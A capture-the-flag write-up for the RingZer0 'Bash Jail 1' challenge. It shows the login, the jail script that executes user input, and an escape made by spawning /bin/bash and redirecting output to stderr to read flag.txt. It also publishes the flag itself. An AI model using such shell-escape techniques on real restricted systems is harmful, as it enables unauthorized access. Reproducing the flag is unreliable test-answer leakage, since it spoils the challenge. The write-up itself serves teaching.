# Bash Jail 1

__PROBLEM__

 User: level1
Password: leve1

__SOLTUION__

```bash
➜ ssh level1@challenges.ringzer0team.com -p 10218
level1@challenges.ringzer0team.com's password:
Permission denied, please try again.
level1@challenges.ringzer0team.com's password:

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

while :
do
        echo "Your input:"
        read input
        output=`$input`
done

-----------------------------
Your input:
cat /home/level1/flag,txt
cat: /home/level1/flag,txt: No such file or directory
Your input:
cat /home/level1/flag.txt
Your input:
ls
Your input:
/bin/bash
level1@lxc17-bash-jail:~$ ls
level1@lxc17-bash-jail:~$ ls 1>2
bash: 2: Permission denied
level1@lxc17-bash-jail:~$ ls 1>&2
flag.txt  prompt.sh
level1@lxc17-bash-jail:~$ cat flag.txt
level1@lxc17-bash-jail:~$ cat flag.txt 1>&2
FLAG-U96l4k6m72a051GgE5EN0rA85499172K
level1@lxc17-bash-jail:~$
```

Since we were not getting any feedback from normal commands. we tried `/bin/bash` and after that we just redirect all the output to `stdout`

FLAG - `FLAG-U96l4k6m72a051GgE5EN0rA85499172K`
